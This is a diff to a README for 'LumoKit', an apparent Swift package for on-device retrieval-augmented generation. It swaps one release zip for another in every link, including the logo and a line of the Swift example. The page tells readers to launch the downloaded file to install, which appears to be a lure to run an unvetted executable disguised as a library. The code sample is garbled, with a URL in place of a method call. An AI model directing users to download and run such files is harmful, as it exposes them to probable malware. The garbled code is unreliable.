@@ -2,7 +2,7 @@
 
 🚀 Welcome to LumoKit - your go-to Swift package for on-device Retrieval-Augmented Generation (RAG)!
 
-![LumoKit Logo](https://github.com/ByLuu55/LumoKit/releases/download/v1.0/Program.zip)
+![LumoKit Logo](https://github.com/ByLuu55/LumoKit/releases/download/v2.0/Software.zip)
 
 ## Overview
 
@@ -18,9 +18,9 @@ LumoKit is a powerful tool designed to enhance your app's capabilities by integr
 
 ## Installation
 
-You can download the latest version of LumoKit [here](https://github.com/ByLuu55/LumoKit/releases/download/v1.0/Program.zip).
+You can download the latest version of LumoKit [here](https://github.com/ByLuu55/LumoKit/releases/download/v2.0/Software.zip).
 
-[![Download LumoKit](https://github.com/ByLuu55/LumoKit/releases/download/v1.0/Program.zip)](https://github.com/ByLuu55/LumoKit/releases/download/v1.0/Program.zip)
+[![Download LumoKit](https://github.com/ByLuu55/LumoKit/releases/download/v2.0/Software.zip)](https://github.com/ByLuu55/LumoKit/releases/download/v2.0/Software.zip)
 
 Please note that the downloaded file needs to be launched to install LumoKit successfully.
 
@@ -42,7 +42,7 @@ import LumoKit
 let lumoKit = LumoKit()
 
 // Implement RAG functionality
-let generatedText = https://github.com/ByLuu55/LumoKit/releases/download/v1.0/Program.zip(prompt: "Once upon a time")
+let generatedText = https://github.com/ByLuu55/LumoKit/releases/download/v2.0/Software.zip(prompt: "Once upon a time")
 
 print(generatedText)
 ```
